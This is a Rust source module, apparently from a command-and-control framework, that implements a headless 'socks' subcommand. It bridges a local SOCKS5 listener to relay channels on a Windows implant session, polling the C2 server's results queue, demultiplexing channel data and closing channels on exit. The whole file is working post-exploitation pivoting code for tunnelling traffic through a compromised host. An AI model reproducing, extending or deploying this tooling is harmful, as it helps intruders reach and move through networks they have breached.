//! Operator-side SOCKS5 bridge — a headless `nyx-cli socks` subcommand that
//! bridges a local SOCKS5 listener to an implant session's relay channels,
//! making the Phase 4 SOCKS/rportfwd relay end-to-end usable.
//!
//! ## Why a separate subcommand (not in-TUI)
//! `GET /api/results` DESTRUCTIVELY drains the session's entire result queue
//! server-side. The TUI's worker loop already polls it per task; a second
//! in-process consumer would race and silently lose rows. So the bridge runs
//! HEADLESS as the SOLE `/api/results` consumer for its session, on its own
//! multi-thread tokio runtime. The TUI isn't running concurrently.
//!
//! ## Layout
//! - [`api`] — REST helpers (`connect`/`channeldata`/`channelclose` + results drain)
//! - [`handshake`] — RFC-1928 SOCKS5 server-side parse/emit
//! - [`relay`] — per-connection state machine + [`relay::ChannelMsg`]
//! - this module — the shared [`BridgeCtx`] (chan→consumer table), the single
//!   poll task that demuxes `/api/results` channel rows by chan, and the
//!   `TcpListener` accept loop.
//!
//! Implant contract (crates/implant-win/src/pivot.rs, commit b53fb25): a channel
//! row's `status` is 0=open-confirmed, 1=data, 2=closed, 3=error. Latency is one
//! beacon sleep+jitter cycle per direction (set a low `/sleep` for active use).

pub mod api;
pub mod handshake;
pub mod relay;

use std::collections::{HashMap, HashSet};
use std::net::SocketAddr;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use anyhow::Result;
use nyx_rest::ResultView;
use tokio::net::TcpListener;
use tokio::sync::mpsc;
use tokio::time::interval;

use relay::ChannelMsg;

/// Shared, lock-protected channel table. Guarded by a single `Mutex` so the
/// poll loop's "did we already see status:0 for this chan?" check is atomic
/// with a connection's registration (the open-confirmation race fix — see
/// [`relay`] docs).
pub struct ChanTable {
    /// chan id → the owning connection's inbound message sender.
    pub by_chan: HashMap<u32, mpsc::Sender<ChannelMsg>>,
    /// chans whose `status:0` arrived before the consumer registered — the
    /// consumer claims these atomically at registration so no open is lost.
    pub seen_open: HashSet<u32>,
}

/// Shared bridge state, cloned (as `Arc`) into the poll task and every conn task.
pub struct BridgeCtx {
    pub client: reqwest::Client,
    pub server: String,
    pub token: Option<String>,
    pub session: String,
    pub chans: Mutex<ChanTable>,
    /// connect `task_id` → chan, so a `kind:"error"` row on the connect task
    /// can be correlated back to its chan (channeldata errors surface as
    /// status:3, not kind:error — see pivot.rs).
    pub task_to_chan: Mutex<HashMap<u64, u32>>,
    /// Client-side cap on concurrent channels (headroom under the implant's
    /// `MAX_CHANNELS=16`).
    pub max_chan: usize,
    /// Current open-channel count (drives the cap).
    pub active: AtomicUsize,
}

/// Entry point for the `nyx-cli socks` subcommand. Binds the SOCKS5 listener,
/// spawns the single results-poll task, and accepts connections until Ctrl-C.
pub async fn run_socks(
    server: String,
    token: Option<String>,
    session: String,
    listen: SocketAddr,
    poll_ms: u64,
    max_chan: usize,
) -> Result<()> {
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(8))
        .build()?;
    let ctx = Arc::new(BridgeCtx {
        client,
        server,
        token,
        session,
        chans: Mutex::new(ChanTable {
            by_chan: HashMap::new(),
            seen_open: HashSet::new(),
        }),
        task_to_chan: Mutex::new(HashMap::new()),
        max_chan,
        active: AtomicUsize::new(0),
    });

    // The poll task is the SOLE /api/results consumer for this session.
    let poll_ctx = ctx.clone();
    tokio::spawn(async move { poll_loop(poll_ctx, poll_ms).await });

    let listener = TcpListener::bind(listen).await?;
    eprintln!(
        "[socks] SOCKS5 listener bound on {listen} (session {}, poll {poll_ms}ms, max-chan {max_chan})",
        session_short(&ctx.session)
    );
    eprintln!("[socks] note: relay latency = one beacon sleep cycle per direction; set a low /sleep on the beacon for active use.");
    eprintln!("[socks] note: implant is IPv4-only — domain/IPv6 targets will fail at connect.");

    loop {
        tokio::select! {
            acc = listener.accept() => match acc {
                Ok((stream, peer)) => {
                    eprintln!("[socks] inbound SOCKS5 from {peer}");
                    let c = ctx.clone();
                    tokio::spawn(async move { relay::handle_conn(stream, c).await; });
                }
                Err(e) => eprintln!("[socks] accept error: {e}"),
            },
            _ = tokio::signal::ctrl_c() => {
                let n = ctx.active.load(Ordering::SeqCst);
                eprintln!("[socks] Ctrl-C: closing {n} channel(s)…");
                let chans: Vec<u32> = ctx.chans.lock().unwrap().by_chan.keys().copied().collect();
                for ch in chans {
                    let _ = api::enqueue_channel_close(
                        &ctx.client, &ctx.server, &ctx.session, ch, &ctx.token,
                    ).await;
                }
                eprintln!("[socks] bye.");
                return Ok(());
            }
        }
    }
}

/// The single results-poll task. Drains `/api/results` every `poll_ms` and
/// dispatches each `kind:"channel"` row to its chan's consumer (or buffers an
/// open in `seen_open` if the consumer isn't registered yet).
async fn poll_loop(ctx: Arc<BridgeCtx>, poll_ms: u64) {
    let mut tick = interval(Duration::from_millis(poll_ms.max(50)));
    loop {
        tick.tick().await;
        let rows =
            match api::fetch_channel_results(&ctx.client, &ctx.server, &ctx.session, &ctx.token)
                .await
            {
                Ok(r) => r,
                Err(e) => {
                    // Transient poll failure — don't tear down live channels; the
                    // implant sockets stay open; data resumes when the poll recovers.
                    eprintln!("[socks] poll error: {e}");
                    continue;
                }
            };
        for row in rows {
            handle_row(&ctx, row);
        }
    }
}

/// Route one drained result row. `try_send` is non-blocking so it's safe to
/// call under the `chans` lock (held for microseconds, never across an await).
fn handle_row(ctx: &BridgeCtx, row: ResultView) {
    if row.kind == "channel" {
        let Some((chan, status)) = parse_chan_status(&row.text) else {
            return;
        };
        let mut g = ctx.chans.lock().unwrap();
        match status {
            0 => {
                if let Some(tx) = g.by_chan.get(&chan) {
                    let _ = tx.try_send(ChannelMsg::Open(chan));
                } else {
                    // Consumer hasn't registered yet — remember so it can't miss this.
                    g.seen_open.insert(chan);
                }
            }
            1 => {
                if let Some(tx) = g.by_chan.get(&chan) {
                    match row.data_hex.as_deref().map(hex::decode).transpose() {
                        Ok(Some(d)) => {
                            if tx.try_send(ChannelMsg::Data(chan, d)).is_err() {
                                eprintln!(
                                    "[socks] chan {chan}: data backlog full (consumer slow?)"
                                );
                            }
                        }
                        Ok(None) => {} // empty data row — nothing to ferry
                        Err(e) => {
                            // Never silently corrupt a tunneled stream (mirrors
                            // rest.rs poll_file_chunks' malformed-hex rule).
                            eprintln!("[socks] chan {chan}: malformed data_hex ({e}) — closing");
                            let _ = tx.try_send(ChannelMsg::Error(chan));
                            g.by_chan.remove(&chan);
                        }
                    }
                }
            }
            2 => {
                if let Some(tx) = g.by_chan.remove(&chan) {
                    let _ = tx.try_send(ChannelMsg::Closed(chan));
                }
                g.seen_open.remove(&chan);
            }
            3 => {
                if let Some(tx) = g.by_chan.remove(&chan) {
                    let _ = tx.try_send(ChannelMsg::Error(chan));
                }
                g.seen_open.remove(&chan);
            }
            _ => {}
        }
    } else if row.kind == "error" {
        // A connect-task failure (e.g. unresolvable host / queue full) comes
        // back as kind:error with the Connect task_id — map it to its chan.
        let chan = ctx.task_to_chan.lock().unwrap().get(&row.task_id).copied();
        if let Some(ch) = chan {
            let tx = ctx.chans.lock().unwrap().by_chan.remove(&ch);
            if let Some(tx) = tx {
                eprintln!(
                    "[socks] chan {ch}: connect failed (task {}): {}",
                    row.task_id, row.text
                );
                let _ = tx.try_send(ChannelMsg::Error(ch));
            }
        }
    }
    // output/ok/file/bof/image: the bridge is the sole consumer and enqueues no
    // such tasks, so these shouldn't appear; silently ignored if they do.
}

/// Parse `"<chan {chan}#{status}>"` (the server's channel-row text encoding —
/// server/src/lib.rs ~974) into `(chan, status)`. Returns `None` on any
/// deviation so a malformed row is skipped, not fatal.
fn parse_chan_status(text: &str) -> Option<(u32, u32)> {
    let s = text.strip_prefix("<chan ")?.strip_suffix(">")?;
    let (c, st) = s.split_once('#')?;
    Some((c.trim().parse().ok()?, st.trim().parse().ok()?))
}

/// First 8 hex chars of a session id, for terse logging.
fn session_short(session: &str) -> &str {
    if session.len() >= 8 {
        &session[..8]
    } else {
        session
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_chan_status_ok() {
        assert_eq!(parse_chan_status("<chan 7#1>"), Some((7, 1)));
        assert_eq!(parse_chan_status("<chan 42#0>"), Some((42, 0)));
        assert_eq!(parse_chan_status("<chan 3#2>"), Some((3, 2)));
    }

    #[test]
    fn parse_chan_status_rejects_garbage() {
        assert_eq!(parse_chan_status("not a channel row"), None);
        assert_eq!(parse_chan_status("<chan >"), None);
        assert_eq!(parse_chan_status("<chan x#1>"), None);
        assert_eq!(parse_chan_status("<chan 1#z>"), None);
    }
}
